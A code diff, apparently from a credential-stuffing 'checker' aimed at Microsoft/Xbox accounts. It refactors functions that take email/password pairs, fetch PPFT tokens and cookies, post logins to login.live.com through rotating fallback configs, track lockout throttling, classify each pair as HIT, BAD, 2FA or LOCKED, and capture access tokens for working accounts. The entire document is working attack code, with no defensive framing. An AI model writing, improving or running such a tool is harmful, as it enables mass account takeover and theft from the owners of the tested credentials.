@@ -44,17 +44,6 @@ _LOGIN_CONFIGS = [
     dict(
         url=(
             "https://login.live.com/ppsecure/post.srf"
-            "?client_id=00000000402B5328"
-            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
-            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
-            "&display=touch&response_type=token&locale=en"
-        ),
-        ppft="-Da1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3$$",
-        cookie="MSFPC=GUID=efghefghefghefghefghefghefghefgh&HASH=efgh&LV=202504&V=4; MUID=98769876987698769876987698769876; MSPOK=$uuid-c632b4d1-5678-4aef-962d-e9a37c2798b5",
-    ),
-    dict(
-        url=(
-            "https://login.live.com/ppsecure/post.srf"
             "?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3"
             "&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E"
             "&opid=5F188DEDF4A1266A&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&pid=15216"
@@ -64,12 +53,14 @@ _LOGIN_CONFIGS = [
     ),
 ]
 
-_cfg_lock   = threading.Lock()
+_cfg_lock    = threading.Lock()
 _cfg_toomany = [0] * len(_LOGIN_CONFIGS)
 _cfg_reset_at = [0.0] * len(_LOGIN_CONFIGS)
 
+
 class NovaLogin:
     pass
+
 
 def get_novalogin():
     global _instance
@@ -79,6 +70,7 @@ def get_novalogin():
                 _instance = NovaLogin()
     return _instance
 
+
 def _record_toomany(idx):
     import time
     now = time.time()
@@ -87,6 +79,7 @@ def _record_toomany(idx):
             _cfg_toomany[idx] = 0
             _cfg_reset_at[idx] = now
         _cfg_toomany[idx] += 1
+
 
 def _get_fresh_ppft_spykii(email, session):
     for _ in range(2):
@@ -138,6 +131,7 @@ def _get_fresh_ppft_spykii(email, session):
             continue
     return None
 
+
 def _get_outlook_tokens(email, session):
     for _ in range(2):
         try:
@@ -187,6 +181,7 @@ def _get_outlook_tokens(email, session):
         except Exception:
             continue
     return None
+
 
 def _spykii_attempt(session, email, password, url, ppft, cookie):
     import time
@@ -262,7 +257,7 @@ def _spykii_attempt(session, email, password, url, ppft, cookie):
             'sign in to your microsoft account', 'no account found',
         )
         if any(k in body for k in bad_patterns):
-            return 'None'
+            return None
 
         toomany_patterns = (
             'you have tried too many times', 'tried too many',
@@ -283,50 +278,51 @@ def _spykii_attempt(session, email, password, url, ppft, cookie):
             return 'LOCKED'
 
         if 'login.live.com' in str(r.url) and 'oauth20_desktop' not in str(r.url):
-            return 'None'
+            return None
 
         return session, None
+
 
 def _ms_login(email, password, session):
     fresh = _get_fresh_ppft_spykii(email, session)
     if fresh:
         url_post, ppft, cookie = fresh
         result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
-        if result not in ('None', '2FA', 'ERROR', 'LOCKED') and result is not None:
+        if result not in (None, '2FA', 'ERROR', 'LOCKED') and result is not None:
             return result
-        if result in ('None', '2FA', 'LOCKED'):
+        if result in (None, '2FA', 'LOCKED'):
             return result
 
     outlook = _get_outlook_tokens(email, session)
     if outlook:
-        url_post, ppft, msprequ, uaid, mspok, oparams = outlook
+        out_url_post, out_ppft, msprequ, uaid, mspok, oparams = outlook
         parts = []
         if msprequ: parts.append(f'MSPRequ={msprequ}')
         if uaid:    parts.append(f'uaid={uaid}')
         if mspok:   parts.append(f'MSPOK={mspok}')
         if oparams: parts.append(f'OParams={oparams}')
         if not parts: parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
-        cookie = '; '.join(parts)
-        result = _spykii_attempt(session, email, password, url_post, ppft, cookie)
-        if result not in ('None', '2FA', 'ERROR', 'LOCKED') and result is not None:
+        out_cookie = '; '.join(parts)
+        result = _spykii_attempt(session, email, password, out_url_post, out_ppft, out_cookie)
+        if result not in (None, '2FA', 'ERROR', 'LOCKED') and result is not None:
             return result
-        if result in ('None', '2FA', 'LOCKED'):
+        if result in (None, '2FA', 'LOCKED'):
             return result
 
     fallback = extract_auth_params(session)
     if fallback and fallback[0]:
-        url_post, ppft = fallback
+        fb_url_post, fb_ppft = fallback
         ck = '; '.join(f'{c.name}={c.value}' for c in session.cookies)
         body = (
             f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
-            f"&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0"
+            f"&PPFT={fb_ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0"
             f"&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0"
             f"&i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1"
             f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
         )
         try:
             r = session.post(
-                url_post, data=body,
+                fb_url_post, data=body,
                 headers={
                     'Host': 'login.live.com', 'Connection': 'keep-alive',
                     'Origin': 'https://login.live.com', 'Referer': _SFTAG_URL,
@@ -342,7 +338,7 @@ def _ms_login(email, password, session):
             if status in ('2FA', 'LOCKED'):
                 return status
             if status == 'BAD':
-                return 'None'
+                return None
         except Exception:
             pass
 
@@ -351,8 +347,8 @@ def _ms_login(email, password, session):
         cfg = _LOGIN_CONFIGS[idx]
         url = cfg['url'].replace('%7bemail%7d', urllib.parse.quote(email))
         result = _spykii_attempt(session, email, password, url, cfg['ppft'], cfg['cookie'])
-        if result == 'None':
-            return 'None'
+        if result is None:
+            return None
         if result in ('2FA', 'LOCKED'):
             return result
         if result == 'ERROR':
@@ -363,6 +359,7 @@ def _ms_login(email, password, session):
 
     return 'ERROR'
 
+
 def authenticate(email, password, session):
     result = _ms_login(email, password, session)
     if result == 'ERROR':
@@ -371,11 +368,12 @@ def authenticate(email, password, session):
         return '2FA'
     if result == 'LOCKED':
         return 'LOCKED'
-    if result == 'None' or result is None:
+    if result is None:
         return 'BAD'
     if isinstance(result, tuple):
         return 'HIT'
     return 'HIT'
+
 
 def authenticate_with_token(email, password, session):
     result = _ms_login(email, password, session)
@@ -385,43 +383,53 @@ def authenticate_with_token(email, password, session):
         return '2FA', None
     if result == 'LOCKED':
         return 'LOCKED', None
-    if result == 'None' or result is None:
+    if result is None:
         return 'BAD', None
     if isinstance(result, tuple):
         login_session, access_token = result
         return 'HIT', access_token
     return 'HIT', None
 
+
 def detect_status(response_text, response_url, cookies):
     txt = response_text
     addr = response_url
+    txt_lower = txt.lower()
+    addr_lower = addr.lower()
+
     bad_patterns = [
-        "Your account or password is incorrect.",
-        "That Microsoft account doesn",
+        "your account or password is incorrect.",
+        "that microsoft account doesn",
         "account doesn't exist",
         "tried to sign in too many times",
-        "Sign in to your Microsoft account",
+        "sign in to your microsoft account",
         "no account found",
     ]
-    if any(k in txt for k in bad_patterns):
+    if any(k.lower() in txt_lower for k in bad_patterns):
         return 'BAD'
     if ',AC:null,urlFedConvertRename' in txt:
         return 'ERROR'
+
     tfa_patterns = [
         'account.live.com/recover', 'identity/confirm',
-        'Email/Confirm', 'Help us protect',
+        'email/confirm', 'help us protect',
         'two-step verification', 'verify your identity', 'authenticator app',
     ]
-    if any(k in txt + addr for k in tfa_patterns):
+    if any(k.lower() in txt_lower + addr_lower for k in tfa_patterns):
         return '2FA'
-    if '/cancel?mkt=' in txt + addr or '/Abuse?mkt=' in txt + addr or 'unusual activity' in txt:
+
+    if '/cancel?mkt=' in txt_lower + addr_lower or '/abuse?mkt=' in txt_lower + addr_lower or 'unusual activity' in txt_lower:
         return 'LOCKED'
+
     cks = {c.name: c.value for c in cookies}
     if 'ANON' in cks or 'WLSSC' in cks or 'oauth20_desktop.srf' in addr or 'access_token' in addr:
         return 'HIT'
+
     if 'login.live.com' in addr and 'oauth20_desktop' not in addr:
         return 'BAD'
+
     return 'HIT'
+
 
 def get_delegate_token(session):
     try:
@@ -445,6 +453,7 @@ def get_delegate_token(session):
     except Exception:
         pass
     return None
+
 
 def get_rps_token(session):
     try:
